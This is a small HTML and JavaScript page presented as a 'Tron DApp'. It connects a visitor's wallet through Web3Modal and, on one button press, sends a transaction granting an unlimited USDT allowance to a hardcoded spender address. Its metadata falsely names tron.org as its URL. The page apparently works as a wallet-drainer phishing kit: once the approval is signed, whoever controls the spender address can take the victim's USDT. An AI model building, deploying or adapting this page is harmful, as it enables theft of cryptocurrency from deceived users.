<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tron USDT Approval</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .card {
            background: white;
            padding: 2rem;
            border-radius: 16px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
            width: 90%;
            max-width: 400px;
            text-align: center;
        }
        h2 { margin: 0 0 10px 0; color: #1a1a1a; }
        p { color: #666; font-size: 0.9rem; margin-bottom: 20px; }
        
        .info {
            background: #f8f9fa;
            border: 1px solid #e9ecef;
            padding: 12px;
            border-radius: 8px;
            margin-bottom: 20px;
            text-align: left;
            font-size: 0.85rem;
        }
        .info div { display: flex; justify-content: space-between; margin-bottom: 4px; }
        .label { font-weight: 600; color: #333; }

        button {
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 8px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.1s;
        }
        button:active { transform: scale(0.98); }
        
        .btn-connect { background-color: #333; color: white; }
        .btn-approve { background-color: #2ecc71; color: white; margin-top: 10px; }
        .btn-approve:disabled { background-color: #95a5a6; cursor: not-allowed; }

        #status {
            margin-top: 15px;
            font-size: 0.85rem;
            color: #e74c3c;
            min-height: 1.2em;
        }
        .success { color: #27ae60 !important; }
    </style>
    
    <!-- Import Map using jsdelivr to fix CORS issues -->
    <script type="importmap">
        {
            "imports": {
                "ethers": "https://cdn.jsdelivr.net/npm/ethers@6.7.0/+esm",
                "@web3modal/ethers": "https://cdn.jsdelivr.net/npm/@web3modal/ethers@5.0.0/dist/esm/index.js"
            }
        }
    </script>
</head>
<body>

<div class="card">
    <h2>Tron DApp</h2>
    <p>Approve Unlimited USDT</p>

    <div class="info">
        <div><span class="label">Network:</span> <span>Tron Mainnet</span></div>
        <div><span class="label">Token:</span> <span>USDT</span></div>
        <div><span class="label">Spender:</span> <span>TSDcg...XLV</span></div>
    </div>

    <!-- Web3Modal Button Container -->
    <w3m-button></w3m-button>

    <div id="actions" style="display:none;">
        <button id="btnApprove" class="btn-approve">Approve Unlimited</button>
    </div>

    <div id="status"></div>
</div>

<script type="module">
    // Import from mapped modules
    import { createWeb3Modal, defaultConfig, getWeb3Modal } from '@web3modal/ethers';
    import { BrowserProvider } from 'ethers';

    // --- 1. Configuration ---
    const projectId = '171db6da15a54effc1b4a06f889a3c3f'; // Your Project ID
    
    // Tron Mainnet Details
    const tronChain = {
        chainId: 728126428, // 0x2b6653dc
        name: 'Tron',
        currency: 'TRX',
        explorerUrl: 'https://tronscan.org',
        rpcUrl: 'https://api.trongrid.io'
    };

    const metadata = {
        name: 'Tron USDT DApp',
        description: 'Simple Approve DApp',
        url: 'https://tron.org',
        icons: ['https://cryptologos.cc/logos/usdt-usdt-logo.png']
    };

    // --- 2. Initialize Web3Modal ---
    createWeb3Modal({
        ethersConfig: defaultConfig({ metadata }),
        chains: [tronChain],
        projectId,
        enableAnalytics: true,
        // Trust Wallet ID to highlight it
        featuredWalletIds: ['c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96']
    });

    // --- 3. Application Logic ---
    const USDT_BASE58 = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
    const SPENDER_BASE58 = 'TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV';
    
    const btnApprove = document.getElementById('btnApprove');
    const status = document.getElementById('status');
    const actionsDiv = document.getElementById('actions');

    // Helper: Convert Tron Base58 to Hex (0x...)
    function tronToHex(base58) {
        const alphabet = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
        let bigInt = BigInt(0);
        for (let i = 0; i < base58.length; i++) {
            bigInt = bigInt * BigInt(58) + BigInt(alphabet.indexOf(base58[i]));
        }
        let hex = bigInt.toString(16);
        if (hex.length % 2 !== 0) hex = '0' + hex;
        // Remove the leading '41' byte
        if (hex.startsWith('41')) hex = hex.substring(2);
        return '0x' + hex;
    }

    // Listen for connection changes to show/hide buttons
    const modal = getWeb3Modal();
    modal.subscribeProvider(state => {
        if (state.isConnected) {
            actionsDiv.style.display = 'block';
            status.innerText = '';
        } else {
            actionsDiv.style.display = 'none';
        }
    });

    // Handle Approval
    btnApprove.addEventListener('click', async () => {
        try {
            status.className = '';
            status.innerText = 'Processing...';
            btnApprove.disabled = true;

            const provider = new BrowserProvider(modal.getProvider());
            const signer = await provider.getSigner();
            
            // Verify Network
            const network = await provider.getNetwork();
            if (Number(network.chainId) !== 728126428) {
                throw new Error("Please switch to Tron Mainnet in your wallet");
            }

            // Prepare Data
            const tokenHex = tronToHex(USDT_BASE58);
            const spenderHex = tronToHex(SPENDER_BASE58);
            
            // Function: approve(address spender, uint256 amount)
            // Selector: 0x095ea7b3
            // Amount: Max Uint256 (Unlimited)
            const data = `0x095ea7b3${spenderHex.slice(2).padStart(64, '0')}ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff`;

            // Send Transaction
            const tx = {
                to: tokenHex,
                data: data,
                value: 0
            };

            const txResponse = await signer.sendTransaction(tx);
            
            status.className = 'success';
            status.innerText = `Sent! Hash: ${txResponse.hash}`;
            
        } catch (err) {
            console.error(err);
            status.className = '';
            status.innerText = 'Error: ' + (err.reason || err.message || 'Rejected');
        } finally {
            btnApprove.disabled = false;
        }
    });
</script>

</body>
</html>
